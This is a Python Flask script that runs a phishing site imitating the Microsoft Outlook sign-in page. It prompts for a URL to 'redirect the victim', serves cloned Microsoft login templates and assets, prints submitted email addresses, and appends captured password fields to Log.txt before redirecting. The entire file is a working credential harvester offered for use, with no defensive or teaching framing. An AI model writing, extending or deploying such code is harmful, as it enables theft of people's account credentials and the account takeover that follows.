from flask import Flask, request, render_template, send_file, redirect
from werkzeug.datastructures import RequestCacheControl
import os

url = input("Enter url to redirect the victim: ")
host= input("enter host: ")
port= input('enter port[default is 80]: ')
if port=="":
    port= 80
else:
    port=int(port)
app = Flask(__name__)
@app.route("/")
def hell():
    return render_template("email.html")



@app.route("/" , methods=["POST"])
def passwd():
    data = request.form.to_dict(flat=False)
    print(data["loginfmt"])
    return render_template("password.html" , email=data["loginfmt"][0])
@app.route("/login.php" , methods=["POST", "GET"])
def reorient():
    data = request.form.to_dict(flat=False)
    with open("Log.txt" , "a") as file:
       file.write(f"{list(data.keys())[0]} : {data[list(data.keys())[0]][0]}\n")
    return redirect(url)

@app.route("/templates/Sign in to Outlook_files/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg")
def Logo1():
    return send_file("templates\\Sign in to Outlook_files\\microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg")

@app.route("/Sign in to Outlook_files/signin-options_4e48046ce74f4b89d45037c90576bfac.svg")
def Logo2():
    return send_file("templates\\Sign in to Outlook_files\\signin-options_4e48046ce74f4b89d45037c90576bfac.svg")

@app.route("/index_files/ConvergedLoginPaginatedStrings.EN.js")
def Logo3():
    return send_file("templates\\index_files\\ConvergedLoginPaginatedStrings.EN.js")
@app.route("/index_files/Converged_v21033.css")
def Logo4():
    return send_file("templates\\index_files\\Converged_v21033.css")


@app.route("/index_files/ConvergedLogin_PCore.js")
def Logo5():
    return send_file("templates\\index_files\\ConvergedLogin_PCore.js")

@app.route("/index_files/ellipsis_white.svg")
def Logo6():
    return send_file("templates\\index_files\\ellipsis_white.svg")

@app.route("/index_files/ellipsis_grey.svg")
def Logo7():
    return send_file("templates\\index_files\\ellipsis_grey.svg")


@app.route("/index_files/microsoft_logo.svg")
def Logo8():
    return send_file("templates\\index_files\\microsoft_logo.svg")


app.run(host=host, port=port)